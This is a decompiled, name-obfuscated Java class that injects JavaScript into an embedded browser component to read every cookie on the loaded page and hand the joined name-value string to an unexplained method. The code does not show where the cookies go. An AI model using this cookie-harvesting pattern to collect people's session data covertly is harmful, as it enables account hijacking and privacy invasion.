/*
 * Decompiled with CFR 0_132.
 * 
 * Could not load the following classes:
 *  chrriis.dj.nativeswing.swtimpl.components.JWebBrowser
 */
import chrriis.dj.nativeswing.swtimpl.components.JWebBrowser;

final class t
implements Runnable {
    private final /* synthetic */ String f;

    t(String string) {
        this.f = string;
    }

    @Override
    public final void run() {
        Object object = System.getProperty("line.separator");
        object = "function getCookies(){" + (String)object + "  var chaine = '';" + (String)object + "  var pairs = document.cookie.split(';');" + (String)object + "  var cookies = {};" + (String)object + "  for (var i=0; i<pairs.length; i++){" + (String)object + "    var pair = pairs[i].split('=');" + (String)object + "    cookies[pair[0]] = unescape(pair[1]);" + (String)object + "\t //alert(pair[0]);" + (String)object + "\tchaine = chaine + pair[0] +'='+ unescape(pair[1]) + ';';" + (String)object + "  }" + (String)object + "  //return cookies;" + (String)object + "  return chaine;" + (String)object + "}" + (String)object + " var myCookies = getCookies();" + (String)object + " return myCookies; ";
        object = ((JWebBrowser)GUI.b().get(this.f)).executeJavascriptWithResult((String)object);
        a.a(object.toString());
    }
}

